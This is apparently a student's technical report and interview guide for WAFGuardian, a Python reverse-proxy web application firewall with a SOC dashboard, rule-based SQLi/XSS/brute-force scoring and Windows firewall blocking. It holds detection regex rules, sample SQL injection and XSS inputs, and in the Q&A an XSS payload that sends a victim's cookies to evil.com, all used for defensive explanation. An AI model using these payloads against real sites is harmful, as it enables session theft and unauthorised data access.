# WAFGuardian — SOC-Level Web Application Firewall
## Project Technical Report & Interview Preparation Guide

**Project Name:** WAFGuardian  
**Type:** Rule-Based Web Application Firewall (WAF) with SOC Dashboard  
**Author:** Sovan Das  
**Institution:** OP Jindal University (BTL23CS08)  
**Repository:** https://github.com/sovandas089/WAF-IDS  
**Tech Stack:** Python, FastAPI, SQLAlchemy, SQLite, Scapy, JavaScript, HTML/CSS  

---

## 1. Executive Summary

WAFGuardian is a production-style, SOC-level Web Application Firewall built entirely in Python. It acts as a **Reverse Proxy** that sits between internet clients and a protected backend server, intercepting all HTTP traffic, inspecting it against a rule-based scoring engine, and blocking malicious actors in real time using Windows Advanced Firewall (`netsh`).

The system features:
- A live SOC dashboard with WebSocket-based real-time alerting
- Persistent log storage using SQLite
- Automated SMTP email alerting for Critical/High/Medium threats
- Offline PCAP forensic analysis for incident response
- Automated temporary IP-blocking with 15-minute expiration timers

---

## 2. System Architecture

```
 Internet Client
       │
       ▼
┌─────────────────────┐
│   WAFGuardian WAF   │  ← Port 8085
│  (Reverse Proxy)    │
│   FastAPI + httpx   │
│                     │
│  ┌───────────────┐  │
│  │ Scoring Engine│  │  ← analyzer.py
│  │  +5 SQLi     │  │
│  │  +5 XSS      │  │
│  │  +10 BruteF  │  │
│  └───────┬───────┘  │
│          │ Score≥10 │
│  ┌───────▼───────┐  │
│  │  IP Blocker   │  │  ← blocker.py (netsh)
│  └───────────────┘  │
│  ┌───────────────┐  │
│  │ SQLite DB     │  │  ← database.py + models.py
│  └───────────────┘  │
│  ┌───────────────┐  │
│  │ SMTP Mailer   │  │  ← mailer.py
│  └───────────────┘  │
└──────────┬──────────┘
           │  (Clean traffic only)
           ▼
   Protected Backend Server
   (localhost:9000)
```

---

## 3. Module Breakdown

### 3.1 `backend/app.py` — Core WAF & API Server
- Built on **FastAPI** running on port `8085`
- Implements a full **Reverse Proxy** using `httpx.AsyncClient`
- Exposes the SOC Dashboard at `/dashboard`
- Provides REST API endpoints:
  - `GET /dashboard/api/rules` — Returns live YAML detection rules
  - `GET /dashboard/api/stats` — Returns threat analytics from SQLite
  - `POST /dashboard/api/analyze_pcap` — Offline PCAP forensic analysis
  - `WS /dashboard/ws/alerts` — WebSocket live alert stream
- Runs two background `asyncio` tasks on startup:
  - `broadcast_alerts()` — drains the alert queue to all connected dashboards
  - `manage_temporary_blocks()` — auto-unblocks IPs every 60 seconds

### 3.2 `backend/analyzer.py` — Threat Scoring Engine
The heart of the WAF. Every request passes through `analyze_request()`:

| Check | Method | Score |
|---|---|---|
| Brute Force | Rate limit (>20 req / 10 sec) | +10 pts |
| SQL Injection | Regex against path + body | +5 pts |
| Cross-Site Scripting | Regex against path + body | +5 pts |
| Block Threshold | Cumulative per-IP score ≥ 10 | IP Blocked |

**Severity Mapping:**
| Score | Severity |
|---|---|
| ≥ 10 | CRITICAL |
| ≥ 5 | HIGH |
| > 0 | MEDIUM |
| 0 | LOW |

Also contains `offline_analyze_request()` — a read-only version for PCAP forensics that does NOT trigger live blocking.

### 3.3 `backend/rules.yaml` — Detection Rules
```yaml
rules:
  sqli:
    - '(?i)(SELECT|UPDATE|INSERT|DELETE|DROP|UNION).*?(FROM|INTO)'
    - '(?i)(%27)|('')|(--)|(%23)|(#)'
    - '(?i)OR\s+1\s*=\s*1'
  xss:
    - '(?i)<script>.*?</script>'
    - '(?i)onerror\s*='
    - '(?i)onload\s*='
    - '(?i)javascript:'
thresholds:
  brute_force:
    max_requests: 20
    time_window_seconds: 10
```
Rules are hot-reloadable — simply edit the YAML and restart the server. New rules can be added without any Python code changes.

### 3.4 `backend/blocker.py` — Firewall Integration
- Calls Windows `netsh advfirewall` to create inbound block rules
- Records block events to SQLite `block_history` table with `unblock_time` (epoch + 15 min)
- `check_expired_blocks()` — queries DB for expired blocks and removes them automatically
- `unblock_ip()` — deletes the `netsh` rule from Windows Firewall

### 3.5 `backend/mailer.py` — SMTP Email Alerting
- Uses Python's `smtplib` + `EmailMessage` to send Gmail SMTP alerts
- Runs in a background thread via `asyncio.to_thread()` so it never blocks traffic
- Fires for CRITICAL, HIGH, and MEDIUM severity events
- Generates professional SOC-style email body with Event Summary, Impact, and Recommended Actions

### 3.6 `backend/database.py` + `backend/models.py` — Persistent Storage
Two SQLAlchemy ORM tables in `waf_logs.db`:

**`alert_logs`** — Every detected threat:
| Column | Type | Description |
|---|---|---|
| id | INT | Auto primary key |
| timestamp | DATETIME | UTC time of detection |
| src_ip | STRING | Attacker's IP address |
| method | STRING | HTTP method (GET/POST) |
| path | STRING | Request path |
| severity | STRING | CRITICAL/HIGH/MEDIUM/LOW |
| score | INT | Threat score |
| reasons | STRING | Attack types detected |
| snippet | STRING | First 200 chars of body |

**`block_history`** — Active IP bans:
| Column | Type | Description |
|---|---|---|
| id | INT | Auto primary key |
| ip | STRING | Blocked IP (unique) |
| timestamp | DATETIME | When blocked |
| unblock_time | FLOAT | Epoch time for auto-unblock |
| reason | STRING | Reason for block |

### 3.7 `frontend/` — SOC Dashboard
- **`index.html`** — Dark-mode SOC dashboard UI
- **`css/style.css`** — Custom dark cyberpunk CSS
- **`js/main.js`** — JavaScript WebSocket client, live alert rendering, PCAP upload handler

---

## 4. Key Technical Features

### 4.1 Reverse Proxy Architecture
Unlike traditional host-based IDS/IPS that sniff packets passively, WAFGuardian operates as an **active inline reverse proxy**. Traffic flows **through** it, giving it the ability to inspect and drop bad requests before they ever reach the backend.

### 4.2 Scoring Engine (Threat Accumulation)
The system uses a **cumulative multi-factor scoring model**. A single SQLi attempt gives +5 points. If the same IP also triggers XSS, it accumulates to +10 — automatically triggering a full IP block. This prevents false positives from single-pattern matches.

### 4.3 Memory-Efficient PCAP Analysis
Uses Scapy's `PcapReader` stream context manager instead of `rdpcap()`. This processes packets one-at-a-time from disk, allowing analysis of multi-gigabyte capture files without loading them into RAM.

### 4.4 Asynchronous by Design
The entire backend is built on Python's `asyncio` event loop. Email alerts, database writes, and WebSocket broadcasts all run as non-blocking background tasks, meaning WAF inspection latency is never affected by I/O operations.

### 4.5 Zero-Intervention Auto-Unblocking
A 60-second polling loop queries the `block_history` table for expired records. When found, it simultaneously executes the `netsh delete rule` command AND removes the IP from the in-memory `blocked_ips` set. No manual admin intervention required.

---

## 5. Threat Attack Flow (End-to-End)

```
1. Attacker sends: GET /search?q=' OR 1=1 -- HTTP/1.1
2. WAF proxy intercepts the request
3. analyzer.py scans path against sqli regex patterns → MATCH
4. Score += 5, severity = "HIGH"
5. asyncio.create_task → SMTP email sent to SOC team
6. asyncio.create_task → Alert saved to SQLite alert_logs
7. Alert pushed to asyncio.Queue
8. broadcast_alerts() sends alert to all WebSocket dashboards
9. Dashboard JS renders live alert card with red border
10. If IP total score >= 10 → netsh block rule created
11. manage_temporary_blocks() loop removes block after 15 min
```

---

## 6. Testing

File: `tests/test_attacks.py`

Three automated test cases:
1. **SQLi Test** — Sends `?q=' OR 1=1 --` payload → Expects `403 Blocked`
2. **XSS Test** — Sends `<script>alert(1)</script>` in query string → Expects `403 Blocked`
3. **Brute Force Test** — Sends 25 rapid requests → Expects block triggered before request 25

Run with:
```bash
.\.venv\Scripts\python.exe tests\test_attacks.py
```

---

## 7. Deployment

### Requirements
```
fastapi
uvicorn
scapy
pyyaml
websockets
python-multipart
httpx
sqlalchemy
```

### Start Command
```bash
.\.venv\Scripts\python.exe -m backend.app
```

### Access Points
| Endpoint | Purpose |
|---|---|
| `http://localhost:8085/dashboard` | SOC Dashboard UI |
| `http://localhost:8085/dashboard/api/stats` | JSON analytics data |
| `http://localhost:8085/dashboard/api/rules` | Live YAML rules |
| `ws://localhost:8085/dashboard/ws/alerts` | WebSocket alert stream |

> **Note:** Running `blocker.py` (via the WAF) requires **Administrator privileges** for `netsh` commands.

---

# Interview Q&A Section

## A. Fundamentals & Concepts

---

**Q1: What is a Web Application Firewall (WAF) and how is it different from a traditional network firewall?**

> **A:** A traditional network firewall operates at Layer 3/4 (IP/TCP) of the OSI model. It works based on IP addresses, ports, and protocols — it has no visibility into the actual content of HTTP requests.
>
> A **WAF** operates at Layer 7 (Application Layer). It understands HTTP — it can inspect request headers, URL parameters, cookies, POST body content, and response data. It can detect and block application-layer attacks like SQL Injection, XSS, CSRF, and command injection that a traditional firewall would pass right through.
>
> In WAFGuardian, we replaced Scapy-based packet sniffing with a true **reverse proxy WAF** that fully parses and reconstructs HTTP requests, giving us deep application-layer inspection capability.

---

**Q2: What is a Reverse Proxy and why did you choose this model?**

> **A:** A reverse proxy is a server that sits in front of one or more backend servers. Clients send their requests to the proxy, which forwards clean traffic to the backend and returns the response.
>
> We chose this model because:
> 1. **Inline inspection** — The WAF has full control. It can block a request before it ever reaches the backend.
> 2. **No agent required** — The backend server doesn't need any modification.
> 3. **Full HTTP parsing** — We can read headers, query strings, and request bodies at application layer.
> 4. **Port transparency** — Clients only ever communicate with WAFGuardian on port 8085.
>
> We implemented this using `httpx.AsyncClient` inside FastAPI's `api_route()` wildcard endpoint.

---

**Q3: Explain the scoring engine. Why use a scoring model instead of just blocking on first match?**

> **A:** A **binary block-on-first-match** approach generates too many false positives. For example, a research paper URL might contain the word "SELECT" — that doesn't make it a SQL injection attack.
>
> Our **cumulative scoring model** addresses this by building confidence before acting:
> - SQL Injection match: +5 points
> - XSS match: +5 points
> - Brute Force rate limit: +10 points
> - Block threshold: ≥ 10 cumulative points per IP
>
> This means a single suspicious match logs and alerts but doesn't block. Only repeated or compounded violations trigger a block. This dramatically reduces false positives while maintaining high detection accuracy — the same model used by enterprise WAFs like ModSecurity's Paranoia Levels.

---

**Q4: What is SQL Injection? Show me a real example your WAF catches.**

> **A:** SQL Injection is an attack where a user manipulates input fields to inject malicious SQL code into a database query.
>
> Example the WAF catches:
> ```
> GET /users?id=1 OR 1=1 --
> ```
> A vulnerable backend might execute:
> ```sql
> SELECT * FROM users WHERE id=1 OR 1=1 --
> ```
> The `OR 1=1` condition always evaluates to true, returning ALL user records. The `--` comment character ignores everything after.
>
> Our WAF regex `(?i)OR\s+1\s*=\s*1` catches this exact pattern in the URL path before it reaches the database.

---

**Q5: What is Cross-Site Scripting (XSS)? How does WAFGuardian detect it?**

> **A:** XSS is an attack where malicious JavaScript is injected into a webpage and executed in another user's browser. It can be used to steal session cookies, redirect users, or perform actions on their behalf.
>
> Example:
> ```
> GET /search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
> ```
>
> WAFGuardian detects this with regex patterns:
> - `(?i)<script>.*?</script>` — catches script tags
> - `(?i)onerror\s*=` — catches inline event handlers like `<img onerror=alert(1)>`
> - `(?i)javascript:` — catches `<a href="javascript:...">` links

---

**Q6: What is Brute Force detection and how is your rate limiting implemented?**

> **A:** Brute Force attacks involve sending a very high volume of requests to guess credentials or overwhelm a service.
>
> Our implementation uses a **sliding window rate limiter**:
> 1. A dictionary `ip_tracker` maps each IP to a list of request timestamps
> 2. On every request, we clean timestamps older than `time_window_seconds` (10 seconds)
> 3. If the remaining count exceeds `max_requests` (20), the flag is raised
> 4. This sliding window is more accurate than a fixed-window approach because it doesn't reset abruptly and miss bursts that span a window boundary.
>
> When triggered, it adds +10 points — instantly reaching the block threshold of 10.

---

**Q7: How does the PCAP analysis work and what is Scapy?**

> **A:** **Scapy** is a powerful Python library for packet manipulation. It can read, create, send, and analyze network packets at a very low level.
>
> For PCAP forensics, we use `scapy.PcapReader` — a streaming generator that reads packets one-at-a-time from disk rather than loading the entire file into RAM. This allows us to safely analyze multi-gigabyte captures.
>
> For each packet we:
> 1. Filter for packets with IP + TCP + Raw payload layers
> 2. Decode the raw payload as UTF-8
> 3. Check if it starts with an HTTP verb (GET, POST, etc.)
> 4. Extract the method, path, and request body
> 5. Run it through `offline_analyze_request()` — the same scoring engine but without live blocking
> 6. Return structured log records with severity badges
>
> The key difference: PCAP analysis uses `offline_analyze_request()` not `analyze_request()`, so it never triggers `netsh` firewall rules or sends emails for historical data.

---

**Q8: Why did you use FastAPI instead of Flask or Django?**

> **A:** Three main reasons:
> 1. **Async-first** — FastAPI is built on Starlette and runs on `asyncio`. This is critical for a WAF proxy because we need to handle many concurrent connections without blocking threads. Flask is synchronous by default.
> 2. **WebSocket support** — FastAPI has native, clean WebSocket support. We use it for the real-time alert stream to the dashboard.
> 3. **Automatic API docs** — FastAPI auto-generates Swagger UI at `/docs`, which is useful for debugging and testing endpoints during development. Django is too heavy for a lightweight proxy service.

---

**Q9: Explain how your WebSocket real-time alerting works.**

> **A:** We implement a publisher-subscriber pattern:
>
> 1. **Publisher:** `analyzer.py` puts alert dicts into `asyncio.Queue()`
> 2. **Background task:** `broadcast_alerts()` in `app.py` runs an infinite loop — it `await`s items from the queue and calls `streamer.broadcast()` for each one
> 3. **WebSocket Manager:** `AlertStreamer` maintains a list of all currently connected dashboard WebSocket clients and sends the JSON alert to all of them
> 4. **Consumer:** The JavaScript dashboard has a `WebSocket` object that receives these messages and instantly renders an alert card in the live feed
>
> The JavaScript also implements **auto-reconnect** — if the WebSocket connection drops (e.g., server restart), it retries every 2 seconds automatically.

---

**Q10: How does the automated IP unblocking work?**

> **A:** When an IP is blocked, two things happen simultaneously:
> 1. `netsh advfirewall firewall add rule ...` — creates a Windows inbound block rule
> 2. A `BlockHistory` record is inserted into SQLite with `unblock_time = current_epoch + 900` (15 minutes)
>
> On startup, `app.py` spawns a background `asyncio` task called `manage_temporary_blocks()`. This runs every 60 seconds and calls `check_expired_blocks()` from `blocker.py`, which:
> 1. Queries SQLite for all records where `unblock_time <= current_time`
> 2. For each expired record: deletes the `netsh` firewall rule, removes the IP from the in-memory `blocked_ips` set, and deletes the DB record
>
> This creates a fully automated threat lifecycle — detect, block, wait, release — without any human intervention.

---

**Q11: How does the email alerting system avoid slowing down the WAF?**

> **A:** SMTP operations involve network I/O — connecting to Gmail's server, TLS handshaking, authentication. If done synchronously on the request thread, this could add 300-2000ms of latency to every blocked request, completely unacceptable for a proxy.
>
> We solve this with two layers of async offloading:
> 1. `asyncio.create_task(send_alert_email(...))` — fires the email as a non-blocking coroutine, returning immediately to the WAF inspection flow
> 2. Inside `send_alert_email()`, the actual SMTP calls run in `asyncio.to_thread(_send)` — this moves the blocking I/O operations to a separate OS thread, completely off the event loop
>
> The WAF inspection and response forwarding completes in microseconds regardless of whether the email succeeds or fails.

---

**Q12: What are the limitations of this WAF?**

> **A:** Honest limitations I'm aware of:
>
> 1. **HTTPS blind** — The WAF proxies HTTP. For HTTPS traffic, it would need to perform SSL termination (TLS interception) to inspect encrypted content — not yet implemented.
> 2. **Regex bypass** — Sophisticated attackers can use encoding tricks (`%3Cscript%3E`, Unicode escapes) to bypass simple regex patterns. A production WAF uses normalized/decoded input before matching.
> 3. **In-memory state** — `ip_scores` and `ip_tracker` dictionaries are lost on server restart. A production system would persist these in Redis.
> 4. **Single-node** — The current architecture runs on one machine. A production WAF cluster would need shared state (e.g., Redis pub/sub for blocked_ips).
> 5. **No ML** — The detection is purely rule-based. Modern WAFs incorporate machine learning models to detect behavioral anomalies that don't match any known signature.
> 6. **Windows-only blocking** — The `netsh` firewall integration only works on Windows. A production deployment would use `iptables` on Linux.

---

**Q13: How would you compare your WAF to industry solutions like ModSecurity or Cloudflare WAF?**

> **A:** 

| Feature | WAFGuardian | ModSecurity | Cloudflare WAF |
|---|---|---|---|
| Architecture | Reverse Proxy | Apache/Nginx Module | Global CDN Edge |
| Rule Engine | Custom Regex + Score | OWASP CRS (5000+ rules) | ML + Rules |
| Blocking | Windows netsh | Server-level | Anycast edge drop |
| SSL Inspection | No | Yes | Yes |
| Geo-blocking | No | With plugins | Yes |
| Dashboard | Custom SOC UI | Requires elk/SIEM | Built-in |
| PCAP Forensics | Yes | No | No |
| Email Alerting | Yes | Via SIEM | Yes |
| Cost | Free/Open | Free/Open | Paid |

> WAFGuardian trades feature breadth for educational clarity and customizability. It demonstrates the same core concepts as enterprise WAFs in a transparent, auditable codebase.

---

**Q14: If you had to extend this project, what would you add next?**

> **A:** My planned roadmap:
> 1. **AbuseIPDB Integration** — real-time IP reputation lookup to flag known malicious IPs before they even make a request
> 2. **GeoIP Lookup** — use MaxMind's database to map attacker IPs to countries and enable geo-blocking
> 3. **ML Anomaly Detection** — train an Isolation Forest or LSTM on baseline traffic patterns to flag statistical outliers
> 4. **Redis State** — replace in-memory dicts with Redis for persistence across restarts and horizontal scaling
> 5. **Docker + Nginx** — containerize the WAF + backend with docker-compose and add an Nginx TLS terminator for HTTPS inspection
> 6. **Slack/Discord Webhooks** — replace SMTP with webhook alerting for faster SOC response

---

**Q15: What did you learn from building this project?**

> **A:** Several key lessons:
>
> 1. **Concurrency is hard** — Managing async tasks, queues, and background loops in `asyncio` requires careful thought about blocking operations. Moving SMTP to `asyncio.to_thread()` was a key insight.
> 2. **False positives are the real enemy** — The first iteration blocked legitimate requests too aggressively. The scoring model was designed specifically to address this.
> 3. **Defensive coding matters** — A WAF that crashes under attack is worse than no WAF. Every exception path needs graceful handling.
> 4. **Security is layered** — No single mechanism is sufficient. Email alerts + DB logging + real-time WebSocket + firewall blocking are all necessary parts of an effective response system.
> 5. **Network programming fundamentals** — Working with Scapy to reconstruct HTTP from raw TCP streams deepened my understanding of the OSI model significantly.

---

## 8. Quick Reference Card

```
Start the WAF:
  .\.venv\Scripts\python.exe -m backend.app

Run Attack Tests:
  .\.venv\Scripts\python.exe tests\test_attacks.py

Dashboard URL:
  http://localhost:8085/dashboard

Target Backend:
  http://localhost:9000  (needs separate service)

Push to GitHub:
  "C:\Program Files\Git\cmd\git.exe" add .
  "C:\Program Files\Git\cmd\git.exe" commit -m "message"
  "C:\Program Files\Git\cmd\git.exe" push origin main
```

---

*Report generated for WAFGuardian v2.0 — SOC-Level Web Application Firewall*
*GitHub: https://github.com/sovandas089/WAF-IDS*
